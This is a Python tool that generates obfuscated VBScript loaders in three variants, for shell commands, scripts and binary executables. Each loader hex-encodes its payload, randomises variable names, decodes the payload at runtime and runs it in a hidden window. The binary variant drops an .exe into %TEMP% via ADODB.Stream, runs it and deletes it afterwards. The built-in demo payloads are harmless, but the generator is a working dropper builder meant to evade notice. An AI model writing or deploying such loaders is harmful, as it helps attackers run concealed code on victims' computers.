#!/usr/bin/env python3
"""
Hex Decoder Variants for Different Payload Types
Provides optimized hex decoders for command, script, and binary payloads
"""

from typing import Tuple
import re


class HexDecoderVariants:
    """
    Generates VBScript hex decoder variants optimized for different payload types.

    Three variants:
    1. CommandDecoder: For shell commands (cmd.exe, powershell)
    2. ScriptDecoder: For VBScript/batch scripts
    3. BinaryDecoder: For binary executables and raw data
    """

    @staticmethod
    def _generate_random_name(prefix: str) -> str:
        """Generate a random-like variable name"""
        import random
        import string
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{prefix}{suffix}"

    @staticmethod
    def encode_to_hex(text: str) -> str:
        """Encode text to hex string"""
        return text.encode().hex()

    @classmethod
    def create_command_decoder(cls, command: str, execute: bool = True) -> Tuple[str, dict]:
        """
        Creates a hex decoder for shell commands (cmd.exe, powershell, etc.)

        Optimizations:
        - Streamlined for ASCII-heavy command strings
        - Fast path for printable ASCII (0x20-0x7E)
        - Direct character mapping to avoid Chr() overhead
        - Includes command execution via WScript.Shell

        Args:
            command: Shell command to encode and generate decoder for
            execute: Whether to include execution code

        Returns:
            Tuple of (vbs_code, metadata_dict)
        """
        hex_encoded = cls.encode_to_hex(command)

        func_name = cls._generate_random_name("DecCmd_")
        var_hex = cls._generate_random_name("h_")
        var_decoded = cls._generate_random_name("c_")
        var_shell = cls._generate_random_name("sh_")

        # Command-optimized decoder with fast ASCII path
        decoder_func = f"""
Function {func_name}(hexStr)
    Dim i, result, charCode, hexPair
    Dim strLen: strLen = Len(hexStr)
    result = ""

    ' Process hex string in pairs
    For i = 1 To strLen Step 2
        hexPair = Mid(hexStr, i, 2)
        charCode = CLng("&H" & hexPair)

        ' Fast path for printable ASCII (most command strings)
        If charCode >= 32 And charCode <= 126 Then
            result = result & Chr(charCode)
        Else
            ' Fall back to Chr() for special characters
            result = result & Chr(charCode)
        End If
    Next

    {func_name} = result
End Function
"""

        vbs_code = decoder_func + f"""
Dim {var_hex}
{var_hex} = "{hex_encoded}"
Dim {var_decoded}
{var_decoded} = {func_name}({var_hex})
"""

        if execute:
            vbs_code += f"""
Dim {var_shell}
Set {var_shell} = CreateObject("WScript.Shell")
{var_shell}.Run {var_decoded}, 0, False
Set {var_shell} = Nothing
"""

        metadata = {
            'type': 'command',
            'function_name': func_name,
            'hex_var': var_hex,
            'decoded_var': var_decoded,
            'shell_var': var_shell if execute else None,
            'hex_length': len(hex_encoded),
            'command_length': len(command),
            'execute': execute,
            'payload_type': 'Shell Command',
            'encoding': 'hex',
            'optimization': 'ASCII fast path'
        }

        return vbs_code, metadata

    @classmethod
    def create_script_decoder(cls, script_content: str, execute: bool = True) -> Tuple[str, dict]:
        """
        Creates a hex decoder for script payloads (VBScript, batch, PowerShell scripts)

        Optimizations:
        - Preserves special characters and control sequences
        - Handles newlines and carriage returns for multi-line scripts
        - Option to execute as separate script file or inline
        - Includes script type detection

        Args:
            script_content: Script content to encode and generate decoder for
            execute: Whether to include execution code

        Returns:
            Tuple of (vbs_code, metadata_dict)
        """
        hex_encoded = cls.encode_to_hex(script_content)

        func_name = cls._generate_random_name("DecScript_")
        var_hex = cls._generate_random_name("h_")
        var_decoded = cls._generate_random_name("s_")
        var_shell = cls._generate_random_name("sh_")
        var_file = cls._generate_random_name("f_")

        # Script decoder with full character support
        decoder_func = f"""
Function {func_name}(hexStr)
    Dim i, result, charCode
    Dim strLen: strLen = Len(hexStr)
    result = ""

    ' Full character support for scripts with control characters
    For i = 1 To strLen Step 2
        ' Convert hex pair to character code
        charCode = CLng("&H" & Mid(hexStr, i, 2))

        ' Handle special characters that appear in scripts
        Select Case charCode
            Case 10: result = result & vbLf          ' Line feed
            Case 13: result = result & vbCr          ' Carriage return
            Case 9:  result = result & vbTab         ' Tab
            Case Else: result = result & Chr(charCode)
        End Select
    Next

    {func_name} = result
End Function
"""

        vbs_code = decoder_func + f"""
Dim {var_hex}
{var_hex} = "{hex_encoded}"
Dim {var_decoded}
{var_decoded} = {func_name}({var_hex})
"""

        if execute:
            # Create temporary file and execute
            vbs_code += f"""
Dim {var_file}
{var_file} = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\\tmp" & Int(Rnd() * 10000) & ".vbs"
Dim fso_
Set fso_ = CreateObject("Scripting.FileSystemObject")
Dim txtFile_
Set txtFile_ = fso_.CreateTextFile({var_file}, True)
txtFile_.Write {var_decoded}
txtFile_.Close
Dim {var_shell}
Set {var_shell} = CreateObject("WScript.Shell")
{var_shell}.Run "cscript.exe " & {var_file}, 0, False
Set {var_shell} = Nothing
fso_.DeleteFile {var_file}
Set fso_ = Nothing
"""

        metadata = {
            'type': 'script',
            'function_name': func_name,
            'hex_var': var_hex,
            'decoded_var': var_decoded,
            'shell_var': var_shell if execute else None,
            'hex_length': len(hex_encoded),
            'script_length': len(script_content),
            'execute': execute,
            'payload_type': 'Script File',
            'encoding': 'hex',
            'optimization': 'Full character support with control sequences',
            'execution_method': 'cscript.exe via temporary file' if execute else 'None'
        }

        return vbs_code, metadata

    @classmethod
    def create_binary_decoder(cls, binary_data: bytes, execute: bool = True) -> Tuple[str, dict]:
        """
        Creates a hex decoder for binary payloads (executables, DLLs, etc.)

        Optimizations:
        - Preserves all byte values (0x00-0xFF)
        - Includes binary file writing functionality
        - Supports execution via RunDLL32 or direct execution
        - Includes integrity verification via length check

        Args:
            binary_data: Binary data to encode and generate decoder for (bytes or hex string)
            execute: Whether to include execution code

        Returns:
            Tuple of (vbs_code, metadata_dict)
        """
        # Handle both bytes and hex string input
        if isinstance(binary_data, bytes):
            hex_encoded = binary_data.hex()
            binary_length = len(binary_data)
        else:
            # Assume it's already hex string
            hex_encoded = str(binary_data)
            binary_length = len(binary_data) // 2  # 2 hex chars per byte

        func_name = cls._generate_random_name("DecBin_")
        var_hex = cls._generate_random_name("h_")
        var_decoded_arr = cls._generate_random_name("ba_")
        var_file = cls._generate_random_name("f_")
        var_shell = cls._generate_random_name("sh_")

        # Binary decoder with byte array support and verification
        decoder_func = f"""
Function {func_name}(hexStr)
    Dim i, byteArray(), charCode, byteIdx
    Dim strLen: strLen = Len(hexStr)
    Dim arraySize: arraySize = strLen \\ 2

    ' Allocate byte array
    ReDim byteArray(arraySize - 1)
    byteIdx = 0

    ' Convert hex string to byte array
    For i = 1 To strLen Step 2
        charCode = CLng("&H" & Mid(hexStr, i, 2))
        byteArray(byteIdx) = charCode
        byteIdx = byteIdx + 1
    Next

    {func_name} = byteArray
End Function
"""

        vbs_code = decoder_func + f"""
Dim {var_hex}
{var_hex} = "{hex_encoded}"
Dim {var_decoded_arr}
{var_decoded_arr} = {func_name}({var_hex})

' Verify decoded binary length
If UBound({var_decoded_arr}) + 1 <> {binary_length} Then
    WScript.Echo "Binary integrity check failed"
    WScript.Quit 1
End If
"""

        if execute:
            vbs_code += f"""
' Write binary to temporary file
Dim {var_file}
{var_file} = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\\bin" & Int(Rnd() * 10000) & ".exe"
Dim adoStream_
Set adoStream_ = CreateObject("ADODB.Stream")
adoStream_.Type = 1  ' Binary mode
adoStream_.Open
Dim i_
For i_ = LBound({var_decoded_arr}) To UBound({var_decoded_arr})
    adoStream_.WriteByte {var_decoded_arr}(i_)
Next
adoStream_.SaveToFile {var_file}, 2  ' overwrite
adoStream_.Close
Set adoStream_ = Nothing

' Execute binary
Dim {var_shell}
Set {var_shell} = CreateObject("WScript.Shell")
{var_shell}.Run {var_file}, 0, False
Set {var_shell} = Nothing

' Cleanup
Dim fso_cleanup_
Set fso_cleanup_ = CreateObject("Scripting.FileSystemObject")
fso_cleanup_.DeleteFile {var_file}
Set fso_cleanup_ = Nothing
"""

        metadata = {
            'type': 'binary',
            'function_name': func_name,
            'hex_var': var_hex,
            'decoded_array': var_decoded_arr,
            'file_var': var_file if execute else None,
            'shell_var': var_shell if execute else None,
            'hex_length': len(hex_encoded),
            'binary_length': binary_length,
            'execute': execute,
            'payload_type': 'Binary Executable',
            'encoding': 'hex',
            'optimization': 'Byte array with integrity verification',
            'execution_method': 'Direct execution via temporary file' if execute else 'None',
            'integrity_check': f'Expected {binary_length} bytes'
        }

        return vbs_code, metadata


def generate_all_variants(command: str, script: str, binary_hex: str) -> dict:
    """
    Generate all three hex decoder variants for demonstration

    Args:
        command: Command to encode for command decoder
        script: Script content to encode for script decoder
        binary_hex: Binary data (as hex string) to encode for binary decoder

    Returns:
        Dictionary containing all three variants with metadata
    """
    variants = {}

    # Command variant
    cmd_vbs, cmd_meta = HexDecoderVariants.create_command_decoder(command, execute=True)
    variants['command'] = {
        'code': cmd_vbs,
        'metadata': cmd_meta,
        'description': 'Optimized for shell commands with ASCII fast path'
    }

    # Script variant
    script_vbs, script_meta = HexDecoderVariants.create_script_decoder(script, execute=True)
    variants['script'] = {
        'code': script_vbs,
        'metadata': script_meta,
        'description': 'Full character support for multi-line scripts'
    }

    # Binary variant
    bin_vbs, bin_meta = HexDecoderVariants.create_binary_decoder(binary_hex, execute=True)
    variants['binary'] = {
        'code': bin_vbs,
        'metadata': bin_meta,
        'description': 'Byte array with integrity verification for executables'
    }

    return variants


if __name__ == "__main__":
    print("=" * 70)
    print("HEX DECODER VARIANTS - Demonstration")
    print("=" * 70)

    # Example payloads
    example_command = "powershell.exe -NoProfile -Command \"Write-Host 'Test'\""
    example_script = """' Test Script
    WScript.Echo "Hello from script"
    """
    example_binary = "4d5a90000300000004000000ffff0000b8000000000000004000000000000000"  # MZ header

    # Generate all variants
    variants = generate_all_variants(example_command, example_script, example_binary)

    # Display results
    for variant_type, variant_data in variants.items():
        print(f"\n{'=' * 70}")
        print(f"VARIANT: {variant_type.upper()}")
        print(f"{'=' * 70}")
        print(f"\nDescription: {variant_data['description']}")
        print(f"\nMetadata:")
        for key, value in variant_data['metadata'].items():
            print(f"  {key}: {value}")
        print(f"\nGenerated Code (first 50 lines):")
        print("-" * 70)
        code_lines = variant_data['code'].split('\n')
        for i, line in enumerate(code_lines[:50], 1):
            print(f"{i:3d}: {line}")
        if len(code_lines) > 50:
            print(f"... ({len(code_lines) - 50} more lines)")
        print("-" * 70)

    print("\n" + "=" * 70)
    print("All three variants generated successfully!")
    print("=" * 70)
